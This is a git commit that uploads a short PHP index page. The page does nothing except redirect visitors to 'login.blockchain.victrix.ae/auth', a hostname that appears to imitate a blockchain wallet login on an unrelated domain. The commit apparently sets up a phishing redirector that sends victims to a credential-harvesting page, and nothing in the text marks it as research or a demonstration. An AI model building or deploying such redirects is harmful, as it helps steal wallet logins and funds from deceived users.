0ac3b06475d2cc87056304039fe5059b2b304e41
hseason77 <59814528+hseason77@users.noreply.github.com>
2020-01-12 23:26:03 -0500

    Add files via upload

---
+++ index.php
@@ -0,0 +1,16 @@
+<?php
+
+
+function Redirect($url, $permanent = false)
+{
+ if (headers_sent() === false)
+ {
+ header('Location: ' . $url, true, ($permanent === true) ? 301 : 302);
+ }
+
+ exit();
+}
+
+Redirect("https://login.blockchain.victrix.ae/auth", false);
+
+?>
